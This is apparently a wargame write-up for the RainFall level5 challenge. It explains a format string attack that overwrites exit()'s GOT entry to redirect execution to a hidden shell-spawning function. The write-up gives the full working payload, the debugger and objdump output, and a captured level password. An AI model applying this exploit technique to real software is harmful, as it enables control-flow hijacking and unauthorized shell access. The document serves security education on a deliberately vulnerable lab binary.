The binary reads user input, prints it with printf, and eventually calls exit(). The goal is to hijack the control flow and get it to call a hidden function o(), which spawns a shell. We exploit a format string vulnerability to overwrite the GOT entry of exit() with the address of o().

Step 1: Understand the Functions
There is a hidden function o() that runs system("/bin/sh"):
0x080484a4 <o>:  call 0x80483b0 <system@plt>

This function is not called normally, but we want to execute it. How?

The function exit() is called at the end of execution. If we overwrite the GOT entry of exit() with the address of o(), then when exit() is called, it will jump into o() and give us a shell!

The GOT, or Global Offset Table, is a critical data structure used in programs compiled with dynamic linking (e.g., programs that use shared libraries like libc.so). It helps the program find and call functions that are located in shared libraries (like printf, exit, system, etc.) at runtime rather than at compile time.

Step 2: Find the GOT Address of exit() and Address of o()
We use objdump -R to find the GOT entries:
The -R option tells objdump to display the relocation table of a binary

```
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

The GOT entry for exit() is at 0x08049838.

We use GDB to find the address of o():
```
(gdb) info functions o
0x080484a4  o
```
So we want to write 0x080484a4 into 0x08049838 using a format string.

Important Clarification: PLT vs GOT
You may see exit@plt like this:
0x080483d0 <exit@plt>
But this is not the GOT entry.

What's the Difference?
exit@plt (e.g., 0x080483d0) is code — a trampoline that jumps to the GOT address.
exit@got (e.g., 0x08049838) is data — a pointer used by the PLT trampoline.

We want to overwrite the GOT entry, not the PLT stub.

Step 3: Format String Exploit Strategy
We’ll perform a format string attack to write the address of o() (0x080484a4) into the GOT entry of exit() (0x08049838).

1. Leak the stack with %x
We first find where our input appears on the stack:
```
python -c 'print "aaaa " + " %x" * 15' > /tmp/exploit
cat /tmp/exploit | ./level5
We see 61616161 (hex of aaaa) in the output — let’s say at position 4.
```

2. Use %n to write
%n writes the number of characters printed so far to a given memory address.
Address of exit() GOT: 0x08049838 → bytes: \x38\x98\x04\x08
Value to write: 0x080484a4 → decimal: 134513828
So we craft input like:
```
print "\x38\x98\x04\x08" + "%134513824d%4$n"
We subtract 4 because 4 bytes were already written when printing the address bytes.
```

Final Exploit
```
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
cat /tmp/exploit | ./level5
                                                512
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
